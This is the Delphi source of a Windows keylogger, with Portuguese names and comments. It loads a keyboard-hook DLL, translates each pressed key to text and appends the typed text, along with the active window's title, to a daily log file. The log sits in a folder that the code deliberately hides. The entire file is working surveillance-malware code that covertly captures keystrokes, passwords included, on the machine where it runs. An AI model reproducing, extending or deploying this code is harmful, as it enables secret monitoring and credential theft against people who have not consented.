unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, StdCtrls;

const
  NomeDLL       = 'HookTeclado.dll';
  CM_MANDA_TECLA  = WM_USER + $1000;


type
  THookTeclado=procedure; stdcall;

type
    TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);

private
    { Private declarations }
    FArqText         : TextFile;
    FNomeJanela      : string;
    FTeclaAnterior   : string;
    FTeclasDigitadas : string;
    ArquivoM         : THandle;
    PReceptor        : ^Integer;
    HandleDLL        : THandle;
    HookOn           : THookTeclado;
    HookOff          : THookTeclado;

    procedure LlegaDelHook(var message: TMessage); message  CM_MANDA_TECLA;
    function  PegarNomeJanela() : string;
    procedure CriarArquivoTexto;
    function CriarDiretorio: string;
    procedure Escrever(pString: string);
    procedure ExecutaAcao(pNomeTecla: string);

public
    { Public declarations }
end;

var
  Form1: TForm1;

const CARACTER = 'QWERTYUIOPASDFGHJKLÇZXCVBNM,.;/?][{}=+-()*%$#@!""1234567890áéóõãÃÕ\|´`^~';  

implementation

uses StrUtils;

{$R *.DFM}

procedure TForm1.FormCreate(Sender: TObject);
var
  lDiretorio : string;
begin
  lDiretorio := ExtractFilePath(Application.Exename)+NomeDLL;
  if not FileExists(lDiretorio) then
    lDiretorio := ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\Windows\SysWOW64\'+NomeDLL;
  if not FileExists(lDiretorio) then
    lDiretorio := ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\Windows\System32\'+NomeDLL;

  HandleDLL:=LoadLibrary(PChar(lDiretorio));
  if HandleDLL = 0 then raise Exception.Create('Não foi possível carregar a DLL!');

  @HookOn :=GetProcAddress(HandleDLL, 'HookOn');
  @HookOff:=GetProcAddress(HandleDLL, 'HookOff');

  IF not assigned(HookOn) or
     not assigned(HookOff)  then
     raise Exception.Create('Não foram encontradas as funções na DLL');

  {Criamos o arquivo de memoria}
  ArquivoM:=CreateFileMapping( $FFFFFFFF,
                               nil,
                               PAGE_READWRITE,
                               0,
                               SizeOf(Integer),
                               'OReceptor');

  {Se o arquivo nao se criou, erro}
  if ArquivoM=0 then
    raise Exception.Create( 'Erro ao criar o arquivo');

  {Direcionamos nossa estrutura ao arquivo de memoria}
  PReceptor:=MapViewOfFile(ArquivoM,FILE_MAP_WRITE,0,0,0);

  {Escrevemos dados no arquivo de memoria}
  PReceptor^:=Handle;
  HookOn;
  FNomeJanela := '';
end;

procedure TForm1.ExecutaAcao(pNomeTecla : string);
var
  lNomeJanela : string;
begin
  if AnsiContainsStr(CARACTER, Uppercase(pNomeTecla)) then
    begin
      if FTeclaAnterior = '' then
        FTeclasDigitadas := FTeclasDigitadas + pNomeTecla;

      FTeclaAnterior := '';
    end
  else
  if AnsiSameStr('Space',pNomeTecla) then
    FTeclasDigitadas := FTeclasDigitadas + ' '
  else
  if AnsiSameStr('Backspace',pNomeTecla) then
    Delete(FTeclasDigitadas,Length(FTeclasDigitadas),1)
  else
  if AnsiMatchStr(pNomeTecla,['Ctrl', 'Right Windows', 'Left Windows']) then
    FTeclaAnterior := pNomeTecla;

  if (AnsiSameStr(UpperCase(pNomeTecla), 'ENTER') or
      (Length(FTeclasDigitadas)>= 100)) and
      (Trim(FTeclasDigitadas) <> '') then
    begin
      CriarArquivoTexto();
      lNomeJanela := PegarNomeJanela();
      if not AnsiSameStr(FNomeJanela, lNomeJanela) then
        begin
          FNomeJanela := lNomeJanela;
          Escrever(lNomeJanela);
        end;
      Escrever(FTeclasDigitadas);
      CloseFile(FArqText);
      FTeclasDigitadas := '';
    end;
end;

procedure TForm1.LlegaDelHook(var message: TMessage);
var
   NomeTecla : array[0..100] of char;
   Acao      : string;
begin
  {Traduzimos de "Virtual key Code" a "TEXTO"}
  GetKeyNameText(Message.LParam,@NomeTecla,50);
  {Observamos se a tecla foi pressionada, soltada o repetida}
  if ((Message.lParam shr 31) and 1)=1 then
    Acao:='Solta'
  else
    if ((Message.lParam shr 30) and 1)=1 then
      Acao:='Repetida'
    else Acao:='Pressionada';

  if Acao = 'Pressionada' then
    ExecutaAcao(String(NomeTecla));
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  Try
   CloseFile(FArqText);
  except
  end;
  
  {Desativamos o Hook}
  if Assigned(HookOff) then
    HookOff;

  {Liberamos a DLL}
  if HandleDLL<>0 then
    FreeLibrary(HandleDLL);

  {Fechamos a vista do arquivo e o arquivo}
  if ArquivoM<>0 then begin
    UnmapViewOfFile(PReceptor);
    CloseHandle(ArquivoM);
  end;
end;

function TForm1.CriarDiretorio() : string;
var
  Attributes : Integer;
begin
  result:= ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\relatorios';
  if not DirectoryExists(result) then
    CreateDir(result);

  // os comandos abaixo ocultam a pasta
  Attributes := faDirectory + faHidden;
  FileSetAttr(result,Attributes);
end;

procedure TForm1.Escrever(pString : string);
begin
  writeln(FArqText, pString);
end;

procedure TForm1.CriarArquivoTexto();
var
  lDiretorio : string;
begin
  lDiretorio := CriarDiretorio() + '\Relatorio_' + FormatDateTime('YYYYMMDD', Date)+ '.txt';

  AssignFile(FArqText,lDiretorio);
  if not FileExists(lDiretorio) then
    ReWrite(FArqText);
//  {$I-} Rewrite(FArqText);
  Append(FArqText);
end;

function TForm1.PegarNomeJanela: string;
var
  H: HWND;
  WindowName: Array[0..255] of Char;
  ClassName: Array[0..255] of Char;
begin
  H := GetForegroundWindow;
  GetWindowText(H, WindowName, SizeOf(WindowName));
  GetClassName(H, ClassName, SizeOf(ClassName));
  result := 'Janela - ' + WindowName;
end;

end.
